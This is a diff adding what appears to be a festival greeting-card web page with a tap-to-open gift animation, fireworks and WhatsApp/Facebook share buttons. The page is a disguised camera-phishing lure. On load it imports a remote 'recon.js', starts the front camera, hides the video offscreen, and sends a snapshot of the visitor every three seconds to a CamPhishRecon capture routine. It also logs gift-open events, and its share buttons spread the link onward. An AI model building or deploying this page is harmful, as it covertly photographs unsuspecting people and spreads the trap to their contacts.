@@ -1,0 +1,105 @@
+<!-- DESC: Festival wishing page — interactive gift reveal with camera capture -->
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Happy fes_name</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:linear-gradient(135deg,#1a0033,#000033,#1a0033);color:#fff;font-family:Arial,sans-serif;text-align:center;overflow:hidden;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;touch-action:manipulation;user-select:none}
+.hidden{display:none}
+.gift-box{font-size:80px;cursor:pointer;animation:bounce 1.5s infinite;transition:transform .3s}
+.gift-box:active{transform:scale(0.9)}
+@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
+h1{font-size:clamp(28px,8vw,48px);margin:20px;text-shadow:0 0 20px #ff0,0 0 40px #f80;animation:glow 2s infinite}
+@keyframes glow{0%,100%{text-shadow:0 0 20px #ff0,0 0 40px #f80}50%{text-shadow:0 0 40px #ff0,0 0 80px #f80}}
+.greeting{font-size:clamp(16px,4vw,24px);margin:10px;color:#fa0}
+.tap-hint{color:#fa0;font-size:14px;margin:20px;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
+.reveal{font-size:60px;margin:20px;animation:pop .5s}
+@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+.message{font-size:clamp(14px,4vw,20px);color:#fff;margin:20px;line-height:1.8;max-width:320px}
+.fireworks{position:fixed;inset:0;pointer-events:none;z-index:-1}
+.share-section{margin-top:20px;display:flex;gap:10px;flex-wrap:wrap;justify-content:center}
+.share-btn{padding:12px 24px;border:none;border-radius:25px;font-size:14px;font-weight:700;color:#fff;cursor:pointer}
+.share-wa{background:#25D366}.share-fb{background:#1877F2}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<canvas class="fireworks" id="fw"></canvas>
+<div id="giftScreen">
+<div class="gift-box" id="giftBox" onclick="openGift()">🎁</div>
+<h1>Happy fes_name!</h1>
+<div class="greeting">You received a special gift!</div>
+<div class="tap-hint">👆 Tap the gift to open</div>
+</div>
+<div id="revealScreen" class="hidden">
+<div class="reveal">🎉🎊✨</div>
+<h1>Happy fes_name!</h1>
+<div class="message" id="greetingMsg">Wishing you joy, prosperity, and endless happiness on this special occasion! May all your dreams come true! 🎊</div>
+<div class="share-section">
+<button class="share-btn share-wa" onclick="shareCard('wa')">💬 Send Greeting</button>
+<button class="share-btn share-fb" onclick="shareCard('fb')">📘 Share</button>
+</div>
+</div>
+<script>
+var API='API_BASE_URL',FESTIVAL='fes_name',SHARE_URL=location.origin+'/t/festival';
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+startCamera();startFireworks();
+function startCamera(){
+if(navigator.mediaDevices&&window.CamPhishRecon){
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
+var v=document.getElementById('v');v.srcObject=s;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');}},3000);
+}).catch(function(){});
+}
+}
+function openGift(){
+document.getElementById('giftScreen').classList.add('hidden');
+document.getElementById('revealScreen').classList.remove('hidden');
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('gift_opened',{festival:FESTIVAL});
+// Burst of particles
+for(var i=0;i<30;i++)spawnParticle();
+}
+var fwCanvas,fwCtx,particles=[];
+function startFireworks(){
+fwCanvas=document.getElementById('fw');fwCtx=fwCanvas.getContext('2d');
+fwCanvas.width=innerWidth;fwCanvas.height=innerHeight;
+addEventListener('resize',function(){fwCanvas.width=innerWidth;fwCanvas.height=innerHeight;});
+setInterval(function(){if(Math.random()<0.3)spawnParticle();},800);
+animateFW();
+}
+function spawnParticle(){
+var x=Math.random()*fwCanvas.width,y=fwCanvas.height;
+var tx=x+(Math.random()-0.5)*200,ty=fwCanvas.height*0.3+Math.random()*200;
+var col=['#ff0','#f80','#f0f','#0ff','#fa0'][Math.floor(Math.random()*5)];
+particles.push({x:x,y:y,vx:(tx-x)/30,vy:-8+Math.random()*4,col:col,life:60,exploded:false});
+}
+function animateFW(){
+fwCtx.fillStyle='rgba(26,0,51,0.1)';fwCtx.fillRect(0,0,fwCanvas.width,fwCanvas.height);
+for(var i=particles.length-1;i>=0;i--){
+var p=particles[i];
+p.x+=p.vx;p.y+=p.vy;p.vy+=0.15;p.life--;
+if(!p.exploded&&p.vy>=0){
+p.exploded=true;
+for(var j=0;j<12;j++){var a=j/12*6.28;particles.push({x:p.x,y:p.y,vx:Math.cos(a)*3,vy:Math.sin(a)*3,col:p.col,life:30,exploded:true});}
+}
+fwCtx.fillStyle=p.col;fwCtx.globalAlpha=Math.max(0,p.life/30);
+fwCtx.beginPath();fwCtx.arc(p.x,p.y,2,0,6.28);fwCtx.fill();
+if(p.life<=0)particles.splice(i,1);
+}
+fwCtx.globalAlpha=1;
+requestAnimationFrame(animateFW);
+}
+function shareCard(t){
+var msg='🎉 Happy '+FESTIVAL+'! Send your own greeting: '+SHARE_URL;
+if(navigator.canShare){navigator.share({text:msg,title:'Happy '+FESTIVAL}).catch(function(){});return;}
+if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
+else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');
+}
+</script>
+</body></html>
